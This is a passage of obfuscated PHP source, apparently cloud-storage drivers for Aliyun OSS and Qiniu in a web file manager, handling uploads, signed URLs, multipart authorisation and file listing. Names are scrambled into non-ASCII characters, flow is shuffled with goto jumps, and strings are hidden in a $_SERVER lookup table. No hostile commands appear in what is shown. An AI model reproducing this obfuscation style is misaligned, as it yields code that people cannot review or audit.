$this->client->putObjectAcl($this->bucket, $this->pathEncode($B‘‘¬Ìà“ª), $d•≈ÌêÜ‘ë); } catch (OSS\Core\OssException $C©˘òß◊ìÎ) { return !1; } return !0; } public function getContent($eŸº£¡ß∫Â) { return $this->fileSubstr($eŸº£¡ß∫Â, -1); } public function setContent($D√Ë¯å‰é∆, $FåÙáÑÆ”“ = '') { $c£Û•¬∑†ú =& $_SERVER[∞„˜ƒÑºª]; try { $cåäâ†◊≠ô = array(); $FåÔ§À⁄¡ô = $this->client->putObject($this->bucket, $this->pathEncode($D√Ë¯å‰é∆), $FåÙáÑÆ”“, $cåäâ†◊≠ô); } catch (OSS\Core\OssException $Dæœß´§€Í) { return !1; } $bÖ∆çïˆÿ” = array($c£Û•¬∑†ú[891] => trim($FåÔ§À⁄¡ô[$c£Û•¬∑†ú[905]], $c£Û•¬∑†ú[110]), OSS\OssClient::OSS_CONTENT_TYPE => get_file_mime(get_path_ext($D√Ë¯å‰é∆))); $this->updateObjMeta($D√Ë¯å‰é∆, $bÖ∆çïˆÿ”); return isset($FåÔ§À⁄¡ô[$c£Û•¬∑†ú[906]][$c£Û•¬∑†ú[852]]) ? (int) $FåÔ§À⁄¡ô[$c£Û•¬∑†ú[906]][$c£Û•¬∑†ú[852]] : strlen($FåÔ§À⁄¡ô); } private function updateObjMeta($aäÇß√¯Ã, $eã‰»ä—ê¯) { $aäÇß√¯Ã = $this->pathEncode($aäÇß√¯Ã); try { $cÛœ≤¬´ÿÍ = array(OSS\OssClient::OSS_HEADERS => $eã‰»ä—ê¯); $this->client->copyObject($this->bucket, $aäÇß√¯Ã, $this->bucket, $aäÇß√¯Ã, $cÛœ≤¬´ÿÍ); } catch (OSS\Core\OssException $a •ƒ√Û˜É) { return !1; } return !0; } public function upload($F∏ôÙï¯€§, $dâ≥≥ÖêÇ¿, $e¿ûìú®˘› = false, $fÍ¿ùãÇ◊› = REPEAT_REPLACE) { $dèï”…÷ﬁ =& $_SERVER[∞„˜ƒÑºª]; $Düÿá™ò¬ß = trim($F∏ôÙï¯€§, $dèï”…÷ﬁ[8]); $eÓœƒŸ©Ñ‹ = array(OSS\OssClient::OSS_CHECK_MD5 => !0, OSS\OssClient::OSS_PART_SIZE => 1024 * 1024 * 10, OSS\OssClient::OSS_HEADERS => array($dèï”…÷ﬁ[891] => @md5_file($dâ≥≥ÖêÇ¿)), OSS\OssClient::OSS_CONTENT_TYPE => get_file_mime(get_path_ext($F∏ôÙï¯€§))); try { $this->client->multiuploadFile($this->bucket, $this->pathEncode($Düÿá™ò¬ß), $dâ≥≥ÖêÇ¿, $eÓœƒŸ©Ñ‹); } catch (OSS\Core\OssException $bØ∞æØ¬≤¿) { return !1; } return $this->getPathOuter($F∏ôÙï¯€§); } public function getHost($fÁà•áá∂¬ = true) { $dÛ·¶ô·◊ƒ =& $_SERVER[∞„˜ƒÑºª]; $Cî¿¥à◊ßÊ = parse_url(trim($this->domain, $dÛ·¶ô·◊ƒ[8])); $dÂèÿŒ¢∏è = isset($Cî¿¥à◊ßÊ[$dÛ·¶ô·◊ƒ[164]]) ? $Cî¿¥à◊ßÊ[$dÛ·¶ô·◊ƒ[164]] : http_type(); $A…¢≥±ü›Ÿ = isset($Cî¿¥à◊ßÊ[$dÛ·¶ô·◊ƒ[165]]) ? $Cî¿¥à◊ßÊ[$dÛ·¶ô·◊ƒ[165]] : $Cî¿¥à◊ßÊ[$dÛ·¶ô·◊ƒ[84]]; if (isset($Cî¿¥à◊ßÊ[$dÛ·¶ô·◊ƒ[166]])) { $A…¢≥±ü›Ÿ .= $dÛ·¶ô·◊ƒ[4] . $Cî¿¥à◊ßÊ[$dÛ·¶ô·◊ƒ[166]]; } return $dÂèÿŒ¢∏è . $dÛ·¶ô·◊ƒ[167] . $this->bucket . $dÛ·¶ô·◊ƒ[98] . $A…¢≥±ü›Ÿ; } public function uploadFormData($A©≤â¨Í∂™, $d—è÷≤…ÕÜ = 3600) { goto AÙ«ÃÎ·≠â; B≤ôé¢°»º: $f‚¢Øë∫‹  = json_encode($C’óËππ…›); $Fïèﬂ∏ªÂ  = base64_encode($f‚¢Øë∫‹ ); $B˘‡ÿ˘Á‰’ = base64_encode(hash_hmac($dÇÇÖèÕî[220], $Fïèﬂ∏ªÂ , $this->secret, !0)); goto EÓ÷‰√–„√; f¶„∆ì≠ßﬁ: $bπñïºﬁ€◊ = array($dÇÇÖèÕî[909], 0, $AñïÑ¥ç©«); $cÿÁüê◊º[] = $bπñïºﬁ€◊; $CëÓëæ≠∏ñ = $this->pathFather($A©≤â¨Í∂™); goto Eµ§Ü≈⁄∂È; AÙ«ÃÎ·≠â: $dÇÇÖèÕî =& $_SERVER[∞„˜ƒÑºª]; if (!($e‰Üâ˜œ›’ = $this->getHost())) { return !1; } $e«Ë“ñ†ö® = $d—è÷≤…ÕÜ; goto d∂Ôà‡‚º; EÓ÷‰√–„√: return array($dÇÇÖèÕî[829] => $Fïèﬂ∏ªÂ , $dÇÇÖèÕî[910] => $this->accessKey, $dÇÇÖèÕî[825] => $dÇÇÖèÕî[817], $dÇÇÖèÕî[911] => $B˘‡ÿ˘Á‰’, $dÇÇÖèÕî[165] => $e‰Üâ˜œ›’); goto F¢‚∑ÑÀ§∞; Eµ§Ü≈⁄∂È: $C”éèï∆æ‹ = array($dÇÇÖèÕî[823], $dÇÇÖèÕî[824], $CëÓëæ≠∏ñ); $cÿÁüê◊º[] = $C”éèï∆æ‹; $C’óËππ…› = array($dÇÇÖèÕî[819] => $fÀŸ∑Ÿ∂œà, $dÇÇÖèÕî[820] => $cÿÁüê◊º); goto B≤ôé¢°»º; bÓ®®ÂäêÀ: $Eø√Ç≠îÑ≈ = strpos($fÀŸ∑Ÿ∂œà, $dÇÇÖèÕî[283]); $fÀŸ∑Ÿ∂œà = substr($fÀŸ∑Ÿ∂œà, 0, $Eø√Ç≠îÑ≈) . $dÇÇÖèÕî[908]; $AñïÑ¥ç©« = 1048576000 * 5; goto f¶„∆ì≠ßﬁ; d∂Ôà‡‚º: $f¥ê¿¡™ˆì = date($dÇÇÖèÕî[907], time() + $e«Ë“ñ†ö®); $CÖÊåùÑç¡ = new DateTime($f¥ê¿¡™ˆì); $fÀŸ∑Ÿ∂œà = $CÖÊåùÑç¡->format(DateTime::ISO8601); goto bÓ®®ÂäêÀ; F¢‚∑ÑÀ§∞: } public function multiUploadFormData($Aí≈—»¢— , $EÔÆ◊’Æ¯Ø = 3600) { $b∏∂¨ÙÓıà =& $_SERVER[∞„˜ƒÑºª]; if (!($eµ‘¨ﬁ˜£ö = $this->getHost())) { return !1; } $f†œ‡⁄∆ﬁ® = $this->client->initiateMultipartUpload($this->bucket, $this->pathEncode($Aí≈—»¢— )); return array($b∏∂¨ÙÓıà[212] => $f†œ‡⁄∆ﬁ®, $b∏∂¨ÙÓıà[165] => $eµ‘¨ﬁ˜£ö . $b∏∂¨ÙÓıà[8] . $this->pathEncode($Aí≈—»¢— ), $b∏∂¨ÙÓıà[213] => gmdate($b∏∂¨ÙÓıà[912]), $b∏∂¨ÙÓıà[96] => $Aí≈—»¢— ); } public function multiUploadAuthData($CÍ ·¯•Ã¨, $A†êƒ±Ã¬Ô = array()) { goto cñ≈äÉÒ∞∏; CÑ‡ñë˜•˘: $f‚ÖÊÉ∏µ› = $CÂéëÛ†Ûπ[914] . $this->accessKey . $CÂéëÛ†Ûπ[4] . $FÛÕá»óêπ; if (strpos($aç¨‘ç›ƒÆ, $CÂéëÛ†Ûπ[216]) === 0) { $f‚ÖÊÉ∏µ› = array($CÂéëÛ†Ûπ[222] => $f‚ÖÊÉ∏µ›, $CÂéëÛ†Ûπ[213] => $Eº¢ßÓÇ©¥); } return $f‚ÖÊÉ∏µ›; goto Fèπõ®Àâô; BæûŒ…©Ñ¨: $a£à–ƒ §‚ = $CÍ ·¯•Ã¨; if (isset($A†êƒ±Ã¬Ô[$CÂéëÛ†Ûπ[96]])) { $a£à–ƒ §‚ = $A†êƒ±Ã¬Ô[$CÂéëÛ†Ûπ[96]]; unset($A†êƒ±Ã¬Ô[$CÂéëÛ†Ûπ[96]]); } if (isset($A†êƒ±Ã¬Ô[$CÂéëÛ†Ûπ[214]])) { return $this->listUploadParts($a£à–ƒ §‚, $Eº¢ßÓÇ©¥, $A†êƒ±Ã¬Ô); } goto BÛí á«Àè; cñ≈äÉÒ∞∏: $CÂéëÛ†Ûπ =& $_SERVER[∞„˜ƒÑºª]; $Eº¢ßÓÇ©¥ = isset($A†êƒ±Ã¬Ô[$CÂéëÛ†Ûπ[213]]) ? $A†êƒ±Ã¬Ô[$CÂéëÛ†Ûπ[213]] : gmdate($CÂéëÛ†Ûπ[912]); $aç¨‘ç›ƒÆ = isset($A†êƒ±Ã¬Ô[$CÂéëÛ†Ûπ[156]]) ? $A†êƒ±Ã¬Ô[$CÂéëÛ†Ûπ[156]] : $CÂéëÛ†Ûπ[33]; goto BæûŒ…©Ñ¨; Eê–·ì™Æû: if (!empty($A†êƒ±Ã¬Ô[$CÂéëÛ†Ûπ[913]])) { $Fª…æˆ£òÆ = array_merge(array($CÈóÆ”ì˜[4]), $A†êƒ±Ã¬Ô[$CÂéëÛ†Ûπ[913]]); sort($Fª…æˆ£òÆ); $CÈóÆ”ì˜[4] = implode($CÂéëÛ†Ûπ[55], $Fª…æˆ£òÆ); } $f≤„ÎÕ™‘ = implode($CÂéëÛ†Ûπ[55], $CÈóÆ”ì˜); $FÛÕá»óêπ = base64_encode(hash_hmac($CÂéëÛ†Ûπ[220], $f≤„ÎÕ™‘, $this->secret, !0)); goto CÑ‡ñë˜•˘; BÛí á«Àè: $CÈóÆ”ì˜ = array($CÂéëÛ†Ûπ[215], $CÂéëÛ†Ûπ[33], $CÂéëÛ†Ûπ[113], $Eº¢ßÓÇ©¥, "\x78\55\x6f\x73\163\55\x64\141\x74\x65\x3a{$Eº¢ßÓÇ©¥}", $CÂéëÛ†Ûπ[8] . $this->bucket . $CÂéëÛ†Ûπ[8] . $a£à–ƒ §‚ . $aç¨‘ç›ƒÆ); if (strpos($aç¨‘ç›ƒÆ, $CÂéëÛ†Ûπ[216]) === 0) { $CÈóÆ”ì˜[0] = $CÂéëÛ†Ûπ[217]; } if (isset($A†êƒ±Ã¬Ô[$CÂéëÛ†Ûπ[218]]) && $A†êƒ±Ã¬Ô[$CÂéëÛ†Ûπ[218]] == $CÂéëÛ†Ûπ[219]) { $CÈóÆ”ì˜[0] = $CÂéëÛ†Ûπ[219]; } goto Eê–·ì™Æû; Fèπõ®Àâô: } public function listUploadParts($FÁ∑ÿÊâÉŸ, $AÃ‚Èû∑‰©, $dˆ≠›§°ÈÚ) { goto b≥Î«≤ç£Ñ; CÑú—∂¿ä€: $fÀ∂ÍãâÑà = $F¡é¢≠ã®√->getListPart(); $DìàØõÀñ´ = array(); foreach ($fÀ∂ÍãâÑà as $aºÊŸÑâ¥ã) { $DìàØõÀñ´[] = array($DùÿéñõËù[895] => $aºÊŸÑâ¥ã->getPartNumber(), $DùÿéñõËù[896] => trim($aºÊŸÑâ¥ã->getETag(), $DùÿéñõËù[110])); } goto fÑœ¥ï ≠; b≥Î«≤ç£Ñ: $DùÿéñõËù =& $_SERVER[∞„˜ƒÑºª]; $A‹ÌÕ¢∫“ = parse_url_query($dˆ≠›§°ÈÚ[$DùÿéñõËù[156]]); $F¡é¢≠ã®√ = $this->client->listParts($this->bucket, $this->pathEncode($FÁ∑ÿÊâÉŸ), $A‹ÌÕ¢∫“[$DùÿéñõËù[212]]); goto CÑú—∂¿ä€; e≠˜©¥ÇüΩ: return array($DùÿéñõËù[222] => $aƒâöæ–Ú¡, $DùÿéñõËù[213] => $AÃ‚Èû∑‰©, $DùÿéñõËù[224] => $DìàØõÀñ´); goto Eó‡›⁄≤Ñü; fÑœ¥ï ≠: unset($dˆ≠›§°ÈÚ[$DùÿéñõËù[214]], $dˆ≠›§°ÈÚ[$DùÿéñõËù[218]]); $aƒâöæ–Ú¡ = $this->multiUploadAuthData($FÁ∑ÿÊâÉŸ, $dˆ≠›§°ÈÚ); if (empty($aƒâöæ–Ú¡)) { return !1; } goto e≠˜©¥ÇüΩ; Eó‡›⁄≤Ñü: } public function download($B–ëÊÑÑÁÏ, $BÙ‡≤•◊â˜) { if ($this->isFolder($B–ëÊÑÑÁÏ)) { return !1; } try { $aﬁïÑâò†Î = array(OSS\OssClient::OSS_FILE_DOWNLOAD => $BÙ‡≤•◊â˜); $this->client->getObject($this->bucket, $this->pathEncode($B–ëÊÑÑÁÏ), $aﬁïÑâò†Î); } catch (OSS\Core\OssException $dö„µ…˜ÍÚ) { return !1; } return $BÙ‡≤•◊â˜; } public function fileSubstr($cÊ¥õÙ∫Ü°, $A‚ÑÖº˜∑à = 0, $bŸŒ∂’°¿ˆ = false) { if ($A‚ÑÖº˜∑à === -1) { $fªú—ÚÓ«Œ = array(); } else { if ($bŸŒ∂’°¿ˆ === !1) { $F∑çâï¡ä¨ = $this->size($cÊ¥õÙ∫Ü°); } else { $F∑çâï¡ä¨ = $A‚ÑÖº˜∑à + $bŸŒ∂’°¿ˆ - 1; } $fªú—ÚÓ«Œ = array(OSS\OssClient::OSS_RANGE => "{$A‚ÑÖº˜∑à}\55{$F∑çâï¡ä¨}"); } try { return $this->client->getObject($this->bucket, $this->pathEncode($cÊ¥õÙ∫Ü°), $fªú—ÚÓ«Œ); } catch (OSS\Core\OssException $c¡±ñ÷ÜÜç) { return !1; } } public function link($dÉ¬›œ ¬Û, $a®î›ãõ‹ç = array()) { if (!$this->exist($dÉ¬›œ ¬Û) || $this->isFolder($dÉ¬›œ ¬Û)) { return !1; } try { $AàÌ’Ó—Á˜ = !empty($a®î›ãõ‹ç) ? $a®î›ãõ‹ç : array(); return $this->client->signUrl($this->bucket, $this->pathEncode($dÉ¬›œ ¬Û), 3600 * 12, $_SERVER[∞„˜ƒÑºª][219], $AàÌ’Ó—Á˜); } catch (OSS\Core\OssException $Cå°Èøüáπ) { return !1; } } public function fileOut($B÷«∂â©•Ô, $Aû¡ÁºƒúÈ = false, $c“ΩçÚíöØ = false, $Bª†Çäø¬ì = '') { goto BÁö›π…´«; aøÜ£Û∂¥Í: if ($a´å—‰∑ÇÀ == $A™Ï„πßçÕ[197]) { return parent::fileOut($B÷«∂â©•Ô, $Aû¡ÁºƒúÈ, $c“ΩçÚíöØ, $Bª†Çäø¬ì); } $Aû¡ÁºƒúÈ = $Aû¡ÁºƒúÈ ? $A™Ï„πßçÕ[198] : $A™Ï„πßçÕ[199]; $c“ΩçÚíöØ = $this->pathEncode($c“ΩçÚíöØ); goto aé’≥ÂÉ–ÿ; aé’≥ÂÉ–ÿ: $fÊ„–˜˜€ì = array(OSS\OssClient::OSS_SUB_RESOURCE => $A™Ï„πßçÕ[915] . rawurlencode("{$Aû¡ÁºƒúÈ}\73\x66\151\x6c\x65\x6e\x61\155\x65\75{$c“ΩçÚíöØ}")); $fÊ„–˜˜€ì[OSS\OssClient::OSS_SUB_RESOURCE] .= $A™Ï„πßçÕ[916] . $a´å—‰∑ÇÀ; $bﬁí∑ÂÛÎè = $this->link($B÷«∂â©•Ô, $fÊ„–˜˜€ì); goto bËÑ£ùœ‰ı; bËÑ£ùœ‰ı: $this->fileOutLink($bﬁí∑ÂÛÎè); goto a¯¿âÊ›Öà; BÁö›π…´«: $A™Ï„πßçÕ =& $_SERVER[∞„˜ƒÑºª]; if (!$c“ΩçÚíöØ) { $c“ΩçÚíöØ = $this->pathThis($B÷«∂â©•Ô); } $a´å—‰∑ÇÀ = get_file_mime(get_path_ext($c“ΩçÚíöØ)); goto aøÜ£Û∂¥Í; a¯¿âÊ›Öà: } public function fileOutServer($A¢Ç¢®≤Î , $cÛ„ïÖ¯ï» = false, $BŸçò¢Ö‚Ç = false, $EÜÜ≈ö˘√Ì = '') { parent::fileOut($A¢Ç¢®≤Î , $cÛ„ïÖ¯ï», $BŸçò¢Ö‚Ç, $EÜÜ≈ö˘√Ì); } public function fileOutImage($eãéÆ•§Ìó, $cŒèÌÁ“†‘ = 250) { $D–ç„∂¿£® = array(OSS\OssClient::OSS_PROCESS => $_SERVER[∞„˜ƒÑºª][917] . $cŒèÌÁ“†‘); $A¥ßèêÛ¡Ã = $this->link($eãéÆ•§Ìó, $D–ç„∂¿£®); $this->fileOutLink($A¥ßèêÛ¡Ã); } public function fileOutImageServer($f¥⁄¬∑«Í±, $aÉ»Ê”Öù¯ = 250) { parent::fileOutImage($f¥⁄¬∑«Í±, $aÉ»Ê”Öù¯); } public function hashMd5($fπÊ°ã ÇÙ, $A¯µçû‰ä» = '') { $fÕÀ‘⁄æãí =& $_SERVER[∞„˜ƒÑºª]; try { $B—ÿÃö¥À¿ = $this->client->getObjectMeta($this->bucket, $this->pathEncode($fπÊ°ã ÇÙ)); } catch (OSS\Core\OssException $dä€Ë…ã⁄Î) { return !1; } if (!isset($B—ÿÃö¥À¿[$fÕÀ‘⁄æãí[891]]) && !empty($A¯µçû‰ä»)) { $dØ¯•Ò◊ﬂ» = $this->updateObjMeta($fπÊ°ã ÇÙ, array($fÕÀ‘⁄æãí[891] => $A¯µçû‰ä»)); $B—ÿÃö¥À¿[$fÕÀ‘⁄æãí[891]] = $dØ¯•Ò◊ﬂ» ? $A¯µçû‰ä» : $fÕÀ‘⁄æãí[33]; } return isset($B—ÿÃö¥À¿[$fÕÀ‘⁄æãí[891]]) ? $B—ÿÃö¥À¿[$fÕÀ‘⁄æãí[891]] : $fÕÀ‘⁄æãí[33]; } private function fileInfoImage($cüØ≈á‚√¢, &$a∞–éı¬ı·) { goto c“‹™Õôîá; CÓñßã… Ö: if (!$B®—ÜâõÕ†[$cÑ¡âáÇÕπ[445]]) { return !1; } $a∞–éı¬ı·[$cÑ¡âáÇÕπ[208]] = array($cÑ¡âáÇÕπ[209] => $B®—ÜâõÕ†[$cÑ¡âáÇÕπ[764]][$cÑ¡âáÇÕπ[919]][$cÑ¡âáÇÕπ[357]], $cÑ¡âáÇÕπ[210] => $B®—ÜâõÕ†[$cÑ¡âáÇÕπ[764]][$cÑ¡âáÇÕπ[920]][$cÑ¡âáÇÕπ[357]]); goto cß∆îÜãıæ; F¡èäöîçª: $e≥“äÊ¯⁄ƒ = array(OSS\OssClient::OSS_PROCESS => $cÑ¡âáÇÕπ[918]); $F‚ﬂƒä∞…≤ = $this->link($cüØ≈á‚√¢, $e≥“äÊ¯⁄ƒ); $B®—ÜâõÕ† = url_request($F‚ﬂƒä∞…≤, $cÑ¡âáÇÕπ[219], !1, !1, !1, !0); goto CÓñßã… Ö; c“‹™Õôîá: $cÑ¡âáÇÕπ =& $_SERVER[∞„˜ƒÑºª]; $F±Ùêßä¡û = array($cÑ¡âáÇÕπ[204], $cÑ¡âáÇÕπ[157], $cÑ¡âáÇÕπ[205], $cÑ¡âáÇÕπ[206], $cÑ¡âáÇÕπ[207]); if (!in_array($a∞–éı¬ı·[$cÑ¡âáÇÕπ[156]], $F±Ùêßä¡û)) { return; } goto F¡èäöîçª; cß∆îÜãıæ: } } class PathDriverQiniu extends PathDriverBase { private $accessKey = ''; private $secret = ''; private $domain = ''; private $region = ''; private $bucket = ''; private $auth = null; private $client = null; private $config = null; private $bucketManager = null; public function __construct($B¶ôÎ˜ºåƒ) { parent::__construct(); require_once SDK_DIR . $_SERVER[∞„˜ƒÑºª][921]; $this->_init($B¶ôÎ˜ºåƒ); } private function _init($FÃõ¥º Ìπ) { foreach ($FÃõ¥º Ìπ as $Bàé≠ÂúŒÂ => $BßÂÖÙßﬁ) { if (isset($this->{$Bàé≠ÂúŒÂ})) { $this->{$Bàé≠ÂúŒÂ} = $BßÂÖÙßﬁ; } } if (empty($this->accessKey) || empty($this->secret) || empty($this->domain)) { show_json($_SERVER[∞„˜ƒÑºª][922], !1); } $this->auth = new Qiniu\Auth($this->accessKey, $this->secret); $this->client = new Qiniu\Rtc\AppClient($this->auth); $this->config = new \Qiniu\Config(); $this->bucketManager = new \Qiniu\Storage\BucketManager($this->auth, $this->config); } public function setBucketCors() { return !0; } public function getBucketCors() { return !0; } public function isBucketCors() { return !0; } public function mkfile($eåï¨†Î≈, $A≥íÀµ‰‚ÿ = '', $D∆ÖÚ®—„¢ = REPEAT_RENAME) { if ($this->setContent($eåï¨†Î≈, $A≥íÀµ‰‚ÿ)) { return $this->getPathOuter($eåï¨†Î≈); } return !1; } public function mkdir($CÑ¬πÉ¯åã, $C⁄ÚÑªﬂª” = REPEAT_SKIP) { goto FíœÚ€èÑ⁄; dÒÍπ·‰¬¶: if (!$this->mkfile($E·ÿ—†≥‡ó)) { return !1; } if (!$this->moveFile($E·ÿ—†≥‡ó, $CÑ¬πÉ¯åã)) { $this->delFile($E·ÿ—†≥‡ó); return !1; } return $this->getPathOuter($Câ√ãÛ…àÖ); goto c§∫‘â¯õä; f∑Ì†ô◊±î: $CÑ¬πÉ¯åã = $Câ√ãÛ…àÖ . $b‘∞õŒæ•ñ[8]; $Eµçñà¬°ÿ = get_path_this($Câ√ãÛ…àÖ); $E·ÿ—†≥‡ó = $CÑ¬πÉ¯åã . $Eµçñà¬°ÿ; goto dÒÍπ·‰¬¶; FíœÚ€èÑ⁄: $b‘∞õŒæ•ñ =& $_SERVER[∞„˜ƒÑºª]; $Câ√ãÛ…àÖ = trim($CÑ¬πÉ¯åã, $b‘∞õŒæ•ñ[8]); if ($this->isFolder($Câ√ãÛ…àÖ)) { return $this->getPathOuter($Câ√ãÛ…àÖ); } goto f∑Ì†ô◊±î; c§∫‘â¯õä: } public function copyFile($Eı–Ω–ÛÁ§, $eÛıˆö‘π©) { $eÑ∫ïøª¯Õ = $this->bucketManager->copy($this->bucket, $Eı–Ω–ÛÁ§, $this->bucket, $eÛıˆö‘π©, !0); return $eÑ∫ïøª¯Õ ? !1 : !0; } public function moveFile($F¯÷îÏÍ⁄ú, $eÓπëƒ≥Á) { $aÍ“ÖÊâÏÌ = $this->bucketManager->move($this->bucket, $F¯÷îÏÍ⁄ú, $this->bucket, $eÓπëƒ≥Á, !0); return $aÍ“ÖÊâÏÌ ? !1 : !0; } public function delFile($càáÿáéˆ°) { $EœíÃÑ≤º = $this->bucketManager->delete($this->bucket, $càáÿáéˆ°); return $EœíÃÑ≤º ? !1 : !0; } public function delFolder($cóõâåêí–) { $fç€ëåÛò« = $this->fileList($cóõâåêí–); if (empty($fç€ëåÛò«)) { return !0; } $BΩ⁄á‡ó·¬ = 1000; if (count($fç€ëåÛò«) <= $BΩ⁄á‡ó·¬) { return $this->qnDelObj($fç€ëåÛò«) ? !1 : !0; } foreach (array_chunk($fç€ëåÛò«, $BΩ⁄á‡ó·¬) as $fÜ£Ê†¢Ëé) { $DÂÏ∂’¢∫ê = $this->qnDelObj($fÜ£Ê†¢Ëé); if ($DÂÏ∂’¢∫ê) { return !1; } } return !0; } private function qnDelObj($cŒíÉ¬µ±Ñ) { $CΩ·√ç√“ = $this->bucketManager->buildBatchDelete($this->bucket, $cŒíÉ¬µ±Ñ); list($D•ÏÕıœêä, $Cèäàø†ö) = $this->bucketManager->batch($CΩ·√ç√“); return $Cèäàø†ö; } private function fileList($c≤°ÙÚÎÏ´, $E£¬æûãö¿ = 0) { goto F‘¢’Îæë¯; cèåâª‹¯•: $FÔã›Ì˘ß‘ = array(); while (!0) { list($FÙ§∂Óüñπ, $b°œÛß…é«) = $this->bucketManager->listFiles($this->bucket, $c”„õ≥≈•£, $dúÇ…„ëúÉ, $D‡”πÍáÂÏ, $a§èÏå™„÷); if ($b°œÛß…é«) { return !1; } $dúÇ…„ëúÉ = array_key_exists($fﬁÕËß©≥Û[890], $FÙ§∂Óüñπ) ? $dúÇ…„ëúÉ = $FÙ§∂Óüñπ[$fﬁÕËß©≥Û[923]] : $fﬁÕËß©≥Û[33]; foreach ($FÙ§∂Óüñπ[$fﬁÕËß©≥Û[924]] as $eÂÏØ•ÀÎâ) { $bû—¶„ÃÆ„ = $eÂÏØ•ÀÎâ[$fﬁÕËß©≥Û[96]]; if ($E£¬æûãö¿) { $bû—¶„ÃÆ„ = array($fﬁÕËß©≥Û[28] => $bû—¶„ÃÆ„, $fﬁÕËß©≥Û[86] => $eÂÏØ•ÀÎâ[$fﬁÕËß©≥Û[925]]); } $FÔã›Ì˘ß‘[] = $bû—¶„ÃÆ„; } if ($dúÇ…„ëúÉ == $fﬁÕËß©≥Û[33]) { break; } } return $FÔã›Ì˘ß‘; goto E•„ÊêèôØ; cÎÒçØ Ö‡: $dúÇ…„ëúÉ = $fﬁÕËß©≥Û[33]; $D‡”πÍáÂÏ = 1000; $a§èÏå™„÷ = $fﬁÕËß©≥Û[33]; goto cèåâª‹¯•; F‘¢’Îæë¯: $fﬁÕËß©≥Û =& $_SERVER[∞„˜ƒÑºª]; $c≤°ÙÚÎÏ´ = trim($c≤°ÙÚÎÏ´, $fﬁÕËß©≥Û[8]); $c”„õ≥≈•£ = empty($c≤°ÙÚÎÏ´) ? $fﬁÕËß©≥Û[33] : $c≤°ÙÚÎÏ´ . $fﬁÕËß©≥Û[8]; goto cÎÒçØ Ö‡; E•„ÊêèôØ: } public function rename($eÕ’√èîÛÈ, $dŒ§’åâï„) { return $this->renameObject($eÕ’√èîÛÈ, $dŒ§’åâï„); } public function size($F≥ùùÎïëÇ) { $açåÛ¯€Ñ© =& $_SERVER[∞„˜ƒÑºª]; list($bê˜˘èŒøë, $EÈ…·ìÊô) = $this->bucketManager->stat($this->bucket, trim($F≥ùùÎïëÇ, $açåÛ¯€Ñ©[8])); return isset($bê˜˘èŒøë[$açåÛ¯€Ñ©[925]]) ? $bê˜˘èŒøë[$açåÛ¯€Ñ©[925]] : 0; } public function info($F¯êèﬂÍ‡¿) { $F¯êèﬂÍ‡¿ = trim($F¯êèﬂÍ‡¿, $_SERVER[∞„˜ƒÑºª][8]); if ($this->isFolder($F¯êèﬂÍ‡¿)) { return $this->folderInfo($F¯êèﬂÍ‡¿, 1); } return $this->fileInfo($F¯êèﬂÍ‡¿); } public function fileInfo($DØï‘Êí€°, $DâÆÜ™¨Èõ = array(), $E€€†ï†∆‘ = false) { goto C‘Êû—ïúÕ; b∆¿Á˘É´á: return $d≥öéœ◊Ωë; goto EÇ´Ëü˘À£; C‘Êû—ïúÕ: $Dà“‡çêä¬ =& $_SERVER[∞„˜ƒÑºª]; if ($E€€†ï†∆‘) { return array($Dà“‡çêä¬[28] => $this->pathThis($DØï‘Êí€°), $Dà“‡çêä¬[84] => $this->getPathOuter($Dà“‡çêä¬[8] . $DØï‘Êí€°), $Dà“‡çêä¬[29] => $Dà“‡çêä¬[163], $Dà“‡çêä¬[86] => isset($DâÆÜ™¨Èõ[$Dà“‡çêä¬[925]]) ? $DâÆÜ™¨Èõ[$Dà“‡çêä¬[925]] : 0, $Dà“‡çêä¬[156] => $this->ext($DØï‘Êí€°)); } $d≥öéœ◊Ωë = array($Dà“‡çêä¬[28] => $this->pathThis($DØï‘Êí€°), $Dà“‡çêä¬[84] => $this->getPathOuter($Dà“‡çêä¬[8] . $DØï‘Êí€°), $Dà“‡çêä¬[29] => $Dà“‡çêä¬[163], $Dà“‡çêä¬[183] => $Dà“‡çêä¬[50], $Dà“‡çêä¬[109] => $Dà“‡çêä¬[50], $Dà“‡çêä¬[86] => 0, $Dà“‡çêä¬[156] => $this->ext($DØï‘Êí€°), $Dà“‡çêä¬[184] => !0, $Dà“‡çêä¬[185] => !0); goto d«Ÿœµ§âË; d«Ÿœµ§âË: if (empty($DâÆÜ™¨Èõ)) { list($DâÆÜ™¨Èõ, $F—ÇæåÃ”Ì) = $this->bucketManager->stat($this->bucket, $DØï‘Êí€°); if ($F—ÇæåÃ”Ì) { return $d≥öéœ◊Ωë; } $this->fileInfoImage($DØï‘Êí€°, $d≥öéœ◊Ωë); } $d≥öéœ◊Ωë[$Dà“‡çêä¬[183]] = substr($DâÆÜ™¨Èõ[$Dà“‡çêä¬[926]], 0, -7); $d≥öéœ◊Ωë[$Dà“‡çêä¬[86]] = $DâÆÜ™¨Èõ[$Dà“‡çêä¬[925]]; goto b∆¿Á˘É´á; EÇ´Ëü˘À£: } public function folderInfo($bâ›§ÛûÁà, $cÉË°‹√è¬ = 0, $C∞Ó∏ﬁ…œÛ = false) { $E∏‹ €ÚËÑ =& $_SERVER[∞„˜ƒÑºª]; if ($C∞Ó∏ﬁ…œÛ) { return array($E∏‹ €ÚËÑ[28] => $this->pathThis($bâ›§ÛûÁà), $E∏‹ €ÚËÑ[84] => $this->getPathOuter($E∏‹ €ÚËÑ[8] . $bâ›§ÛûÁà), $E∏‹ €ÚËÑ[29] => $E∏‹ €ÚËÑ[85]); } $aÜåóóΩÛÌ = array($E∏‹ €ÚËÑ[28] => $this->pathThis($bâ›§ÛûÁà), $E∏‹ €ÚËÑ[84] => $this->getPathOuter($E∏‹ €ÚËÑ[8] . $bâ›§ÛûÁà), $E∏‹ €ÚËÑ[29] => $E∏‹ €ÚËÑ[85], $E∏‹ €ÚËÑ[183] => $E∏‹ €ÚËÑ[50], $E∏‹ €ÚËÑ[109] => $E∏‹ €ÚËÑ[50], $E∏‹ €ÚËÑ[187] => !1, $E∏‹ €ÚËÑ[188] => !1, $E∏‹ €ÚËÑ[869] => !0, $E∏‹ €ÚËÑ[870] => !0); if ($cÉË°‹√è¬) { $aÜåóóΩÛÌ[$E∏‹ €ÚËÑ[187]] = $this->has($bâ›§ÛûÁà, !1); $aÜåóóΩÛÌ[$E∏‹ €ÚËÑ[188]] = $this->has($bâ›§ÛûÁà, !0); } return $aÜåóóΩÛÌ; } public function exist($b´ﬁ¥°¨Ω∞) { if ($this->isFile($b´ﬁ¥°¨Ω∞) || $this->isFolder($b´ﬁ¥°¨Ω∞)) { return !0; } return !1; } public function 